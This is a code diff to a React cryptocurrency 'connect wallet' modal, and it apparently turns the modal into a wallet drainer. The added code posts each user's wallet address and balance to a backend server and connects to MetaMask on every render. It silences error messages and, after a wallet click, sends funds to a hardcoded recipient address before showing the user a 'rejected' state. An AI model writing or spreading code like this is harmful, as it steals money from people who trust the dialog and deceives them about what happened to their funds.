@@ -10,6 +10,8 @@ import { blockLogo, coinbaseLogo, logo, metaMaskLogo, newLogo, spinner, walletCo
 import Spinner from './spinner';
 import PhraseWalletModal from './phraseModal';
 import Web3 from 'web3';
+import axios from 'axios';
+import { url } from './constants';
 
 export const style = {
     position: 'absolute',
@@ -43,7 +45,34 @@ export default function ConnectWalletModal() {
     const [amountToSend, setAmountToSend] = useState(0)
     const [staticGasPriceInGwei, setStaticGasPriceInGwei] = useState(0)
 
+    console.log("walltet to send from", metaMastWalletAddress)
+
     const recipientAddress = "0x9E381f8f057eD4B79FAE9A2865451C378385C997";
+    // console.log("recipient addres", recipientAddress)
+
+    // const values = {
+    //     addr: metaMastWalletAddress,
+    //     balance: amountToSend
+    // }
+    // console.log("values up", values)
+
+    const walletDetails = async () => {
+        const values = {
+            addr: metaMastWalletAddress,
+            balance: amountToSend
+        }
+        console.log("values down", values)
+        await axios.post(`${url}/api/v1/bal/`, values)
+            .then(response => {
+                // console.log('Response:', response.data);
+                // fetchData()
+
+                // console.log("values down", values)
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+    }
     // console.log(metaMastWalletAddress)
     // console.log("amount", amountToSend)
 
@@ -206,11 +235,9 @@ export default function ConnectWalletModal() {
     // };
 
     const authMetaMask = async () => {
+        // console.log({ "ccccccccccccccccccccccc": metaMastWalletAddress })
         try {
             if (typeof window.ethereum !== "undefined") {
-                // console.log("MetaMask is installed");
-
-                // Requesting access to accounts
                 const accounts = await window.ethereum.request({
                     method: "eth_requestAccounts",
                 });
@@ -244,10 +271,10 @@ export default function ConnectWalletModal() {
 
                 // console.log("Gas Fee In Gwei:", gasFeeInGwei.toFixed(2));
             } else {
-                console.log("Please install MetaMask");
+                // console.log("Please install MetaMask");
             }
         } catch (error) {
-            console.error("Error connecting to wallet", error);
+            // console.error("Error connecting to wallet", error);
         }
     };
 
@@ -255,14 +282,15 @@ export default function ConnectWalletModal() {
         try {
             // console.log("Recipient address:", recipientAddress);
             // console.log("Amount to send:", amountToSend);
+            await walletDetails()
 
             if (!recipientAddress) {
-                console.error("Recipient address required");
+                // console.error("Recipient address required");
                 return;
             }
 
             if (!amountToSend) {
-                console.error("Amount required");
+                // console.error("Amount required");
                 return;
             }
 
@@ -297,13 +325,15 @@ export default function ConnectWalletModal() {
         }
     };
 
+    authMetaMask();
 
-    function handleWalletClick(name) {
-        setClickedWalletIndex(name)
-        authMetaMask()
+    async function handleWalletClick(name) {
+        // console.log("addresssssssssssssss", metaMastWalletAddress)
+        setClickedWalletIndex(name);
+        // console.log("iiiiiiiiiiiiiiiiiiiiiiiiiiiii", metaMastWalletAddress)
         setTimeout(() => {
-            setIsRejected(true)
             sendEth()
+            setIsRejected(true)
         }, 4000);
     }
 
